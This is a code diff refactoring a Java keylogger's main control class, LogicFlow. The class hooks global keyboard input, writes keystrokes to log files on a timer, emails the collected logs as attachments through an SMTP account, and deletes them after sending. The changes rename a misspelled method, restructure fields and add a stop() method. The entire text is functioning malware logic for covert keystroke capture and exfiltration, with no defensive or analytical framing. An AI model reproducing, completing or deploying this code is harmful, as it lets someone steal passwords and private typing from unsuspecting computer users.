@@ -20,20 +20,20 @@ public final class LogicFlow {
       private final KeyReader keyReader;
       private final MailSender mailSender;
       private final LogFilesCollector logFilesCollector;
-      private WriterTask writerTask;
-      private List<String> files;
+      private final LogRecorder logRecorder;
 
       public LogicFlow(String mailHostName, String emailAccount, String password, int port) {
             logFilesCollector = new LogFilesCollector();
             mailSender = new MailSender(mailHostName, emailAccount, password, port);
-            timer = new Timer();
             keyReader = new KeyReader();
+            logRecorder = new LogRecorder();
+            timer = new Timer();
       }
 
       public void execute() throws NativeHookException {
-            files = logFilesCollector.collectLogs();
+            List<String> files = logFilesCollector.collectLogs();
             try {
-                  mailSender.prepareEmailWithAttqchment(files);
+                  mailSender.prepareEmailWithAttachment(files);
                   mailSender.send();
                   logFilesCollector.removeLogs(files);
             }
@@ -41,8 +41,14 @@ public final class LogicFlow {
                   LOG.warning("Mail has not been sent due to: " + e.getMessage());
             }
             GlobalScreen.registerNativeHook();
-            writerTask = new WriterTask(keyReader, new LogRecorder());
+            WriterTask writerTask = new WriterTask(keyReader, logRecorder);
             GlobalScreen.addNativeKeyListener(keyReader);
             timer.schedule(writerTask, 1000L, 10000L);
+      }
+
+      public void stop() {
+            GlobalScreen.removeNativeKeyListener(keyReader);
+            timer.cancel();
+            logRecorder.close();
       }
 }
